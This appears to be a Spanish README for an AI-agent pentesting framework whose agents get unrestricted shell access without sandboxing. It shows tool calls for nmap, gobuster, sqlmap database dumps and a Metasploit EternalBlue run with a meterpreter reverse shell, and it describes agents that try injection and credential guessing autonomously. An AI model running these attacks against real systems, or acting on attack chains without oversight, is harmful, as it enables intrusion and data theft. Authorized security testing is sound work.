# 🔓 Agentes Sin Restricciones - Guía de Uso

## Capacidades Completas

Los agentes ahora tienen **acceso total al sistema** sin restricciones para realizar pentesting real.

## 🛠️ Herramientas Disponibles

### 1. Comando Arbitrario (`command`)

**Todos los roles** ahora tienen acceso al tool `command` que permite ejecutar **cualquier comando** del sistema.

**Ejemplo de uso con un agente:**

```
USER: "Escanea el puerto 80 de 192.168.1.1"

AGENT: *Ejecuta internamente*
{
  "tool": "command",
  "params": {
    "cmd": "nmap -p 80 -sV 192.168.1.1"
  }
}

AGENT: "He escaneado el puerto 80. Aquí los resultados: 
[output del nmap...]"
```

### 2. Nmap Integrado

```
{
  "tool": "nmap",
  "params": {
    "target": "192.168.1.0/24",
    "flags": "-sV -sC -p-"
  }
}
```

### 3. Gobuster (Directory Busting)

```
{
  "tool": "gobuster",
  "params": {
    "url": "http://target.com",
    "wordlist": "/usr/share/wordlists/dirb/common.txt",
    "extensions": "php,html,txt"
  }
}
```

### 4. SQLMap

```
{
  "tool": "sqlmap",
  "params": {
    "url": "http://target.com/page?id=1",
    "params": "id",
    "extra_args": "--dbs --batch"
  }
}
```

### 5. Metasploit

```
{
  "tool": "metasploit",
  "params": {
    "commands": [
      "use exploit/windows/smb/ms17_010_eternalblue",
      "set RHOSTS 192.168.1.10",
      "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
      "set LHOST 192.168.1.5",
      "run"
    ]
  }
}
```

### 6. Browser Automation

**Navegación y extracción:**
```
{
  "tool": "browser",
  "params": {
    "action": "navigate",
    "url": "http://target.com"
  }
}

Retorna:
- Title de la página
- Lista de links
- Formularios encontrados
- Conteo de elementos
```

**Screenshot:**
```
{
  "tool": "browser",
  "params": {
    "action": "screenshot",
    "url": "http://target.com",
    "path": "/tmp/screenshot.png"
  }
}
```

## 📋 Workflows de Ejemplo

### Workflow 1: Reconocimiento Web Completo

1. **Crear Recon Agent** (llama3.2)
   
   ```
   USER: "Analiza completamente el sitio http://testphp.vulnweb.com"
   
   AGENT: Ejecutará automáticamente:
   - nmap para detectar puertos y servicios
   - Browser para extraer links y formularios
   - whatweb para identificar tecnologías
   - Análisis de headers HTTP
   ```

2. **Resultados automáticos**:
   - Puertos abiertos
   - Tecnologías identificadas
   - Estructura del sitio
   - Formularios potencialmente vulnerables

### Workflow 2: Explotación SQL Injection

1. **Crear Exploit Agent** (mistral)

   ```
   USER: "Testea SQL injection en http://testphp.vulnweb.com/artists.php?artist=1"
   
   AGENT: Ejecutará:
   - Detección manual con payloads básicos
   - sqlmap automatizado si detecta vulnerabilidad
   - Extracción de bases de datos
   - Dump de tablas
   ```

### Workflow 3: Multi-Agente Colaborativo

1. **Recon Agent**: Descubre superficie de ataque
2. **Exploit Agent**: Identifica y explota vulnerabilidades
3. **Analysis Agent**: Documenta hallazgos y recomienda mitigaciones

```
USER (a Recon): "Escanea 192.168.1.0/24"
→ Recon encuentra host con puerto 80 abierto

USER (a Exploit): "Analiza http://192.168.1.50 por vulnerabilidades"
→ Exploit encuentra SQL injection

USER (a Analysis): "Documenta este hallazgo: [resultados]"
→ Analysis genera reporte detallado
```

## 🚀 Ejemplos Prácticos

### Ejemplo 1: Nmap Full Scan

```
USER: "Haz un escaneo completo de 192.168.1.10"

AGENT (internamente):
{
  "type": "tool_use",
  "tool": "nmap",
  "params": {
    "target": "192.168.1.10",
    "flags": "-sV -sC -p- -A"
  }
}

AGENT: "Escaneo completado. Encontré:
- Puerto 22: SSH OpenSSH 7.4
- Puerto 80: Apache 2.4.6
- Puerto 3306: MySQL 5.5.60
..."
```

### Ejemplo 2: Web Fuzzing

```
USER: "Encuentra directorios ocultos en http://target.com"

AGENT:
{
  "type": "tool_use",
  "tool": "gobuster",
  "params": {
    "url": "http://target.com",
    "wordlist": "/usr/share/wordlists/dirb/big.txt"
  }
}

AGENT: "Directorios encontrados:
- /admin (Status: 200)
- /backup (Status: 403)
- /config (Status: 200)
..."
```

### Ejemplo 3: Comando Personalizado

```
USER: "Ejecuta un ping sweep de la red 10.0.0.0/24"

AGENT:
{
  "type": "tool_use",
  "tool": "command",
  "params": {
    "cmd": "for i in {1..254}; do ping -c 1 10.0.0.$i > /dev/null && echo \"10.0.0.$i is up\"; done"
  }
}

AGENT: "Hosts activos:
- 10.0.0.1
- 10.0.0.15
- 10.0.0.23
..."
```

### Ejemplo 4: Exploit Automation

```
USER: "Busca y explota EternalBlue en 192.168.1.20"

AGENT (Exploit Agent):
{
  "type": "tool_use",
  "tool": "metasploit",
  "params": {
    "commands": [
      "use exploit/windows/smb/ms17_010_eternalblue",
      "set RHOSTS 192.168.1.20",
      "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
      "set LHOST <your-ip>",
      "exploit"
    ]
  }
}

AGENT: "Exploit ejecutado. Resultado: [... meterpreter session opened ...]"
```

## ⚡ Modo Totalmente Autónomo

Los agentes pueden tomar decisiones y ejecutar acciones **automáticamente** basándose en su rol:

### Recon Agent (Autónomo):

```
USER: "Reconocimiento completo de target.com"

AGENT decide y ejecuta:
1. nmap -sV -sC target.com
2. Browser: navegar y extraer estructura
3. whatweb target.com
4. subfinder -d target.com
5. Genera reporte consolidado
```

### Exploit Agent (Autónomo):

```
USER: "Encuentra vulnerabilidades en http://target.com/login.php"

AGENT decide y ejecuta:
1. Browser: analiza formulario
2. Intenta SQL injection manual
3. Si detecta vuln, ejecuta sqlmap
4. Intenta XSS en campos
5. Prueba credenciales comunes
6. Genera PoC de vulnerabilidades encontradas
```

## 🔐 Sin Restricciones

- ✅ **Whitelist expandida**: 30+ herramientas permitidas
- ✅ **Tool `command`**: Ejecuta CUALQUIER comando shell
- ✅ **Timeout extendido**: 15 minutos para comandos complejos
- ✅ **Todos los roles**: Tienen acceso completo
- ✅ **Sin sandboxing**: Acceso directo al sistema

## ⚠️ Advertencia de Uso

> **IMPORTANTE**: Los agentes tienen acceso total al sistema. Solo usa en:
> - Entornos de laboratorio controlados
> - Máquinas virtuales aisladas
> - Sistemas para los que tienes autorización explícita

**Nunca uses contra sistemas en producción sin autorización.**

## 📝 Logs y Workspace

Todos los comandos se ejecutan desde:
```
/tmp/pentest-playground/
```

Outputs y archivos generados se guardan ahí automáticamente.

## 🎯 Casos de Uso Reales

### 1. Bug Bounty
```
Recon Agent → Mapeo completo del objetivo
Exploit Agent → Identificación de vulnerabilidades
Analysis Agent → Documentación para reporte
```

### 2. Red Team Exercise
```
Custom Agent con acceso completo → Simulación de atacante real
- Exfiltración de datos
- Movimiento lateral
- Persistencia
```

### 3. Pentesting Tradicional
```
Secuencia de agentes especializados:
1. Recon: Superficie de ataque
2. Exploit: Penetración inicial
3. Analysis: Documentación y remediación
```

---

**Los agentes ahora son herramientas reales de pentesting con capacidades completas. Úsalos sabiamente.** 🔐
